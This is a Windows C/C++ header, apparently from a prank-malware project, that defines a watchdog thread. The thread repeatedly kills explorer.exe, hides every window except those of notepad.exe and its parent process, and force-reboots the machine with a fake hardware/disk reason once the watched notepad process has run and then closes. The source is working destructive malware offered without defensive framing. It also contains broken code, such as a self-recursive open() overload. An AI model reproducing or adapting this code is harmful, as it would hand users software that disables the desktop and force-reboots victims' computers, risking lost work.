#pragma once
#include <Windows.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>
BOOLEAN block = FALSE;
BOOLEAN bonziRun = FALSE;
BOOL bonziRunOnce = FALSE;
void killWindowsInstant1() {
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}

HANDLE open(LPWSTR path, LPWSTR args) {
	return open(path, args);
}
HANDLE open(LPWSTR path, LPWSTR args, LPWSTR dir) {
	STARTUPINFO sinfo;
	for (int i = 0; i < sizeof(sinfo); ((char*)&sinfo)[i++] = 0)
		sinfo.cb = sizeof(sinfo);

	PROCESS_INFORMATION pinfo;
	CreateProcessW(path, args, NULL, NULL, FALSE, 0, NULL, dir, &sinfo, &pinfo);

	return pinfo.hProcess;
}
BOOL CALLBACK hideProc2(HWND hwnd, LPARAM lParam) {
	DWORD pid;
	GetWindowThreadProcessId(hwnd, &pid);

	PROCESSENTRY32 proc;
	proc.dwSize = sizeof(proc);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	Process32First(snapshot, &proc);

	BOOL good = (pid == lParam || pid == GetCurrentProcessId());
	do {
		if (proc.th32ProcessID == pid &&
			(proc.th32ParentProcessID == lParam || lstrcmpiW(proc.szExeFile, L"notepad.exe") == 0)) {
			good = TRUE;

			if (IsWindowVisible(hwnd)) {
				bonziRun = TRUE;
				bonziRunOnce = TRUE;
			}

			break;
		}
	} while (Process32Next(snapshot, &proc));

	CloseHandle(snapshot);

	if (!good)
		ShowWindow(hwnd, SW_HIDE);

	return TRUE;
}
DWORD WINAPI bonziWatchdogThread(LPVOID parameter) {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	int w = rekt.right - rekt.left;
	int h = rekt.bottom - rekt.top;

	for (;;) {
		PROCESSENTRY32 proc;
		proc.dwSize = sizeof(proc);

		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		Process32First(snapshot, &proc);

		bonziRun = FALSE;
		DWORD bonzi = 0;

		do {
			if (lstrcmpiW(proc.szExeFile, L"notepad.exe") == 0) {
				bonziRun = TRUE;
				bonzi = proc.th32ProcessID;
			}
			else if (lstrcmpiW(proc.szExeFile, L"explorer.exe") == 0) {
				TerminateProcess(OpenProcess(PROCESS_TERMINATE, FALSE, proc.th32ProcessID), 0);
			}
		} while (Process32Next(snapshot, &proc));

		CloseHandle(snapshot);

		if (!bonziRun && bonziRunOnce)
			killWindowsInstant1();

		bonziRun = FALSE;
		EnumWindows(hideProc2, bonzi);
		if (!bonziRun && bonziRunOnce)
			killWindowsInstant1();

		Sleep(50);
	}
}
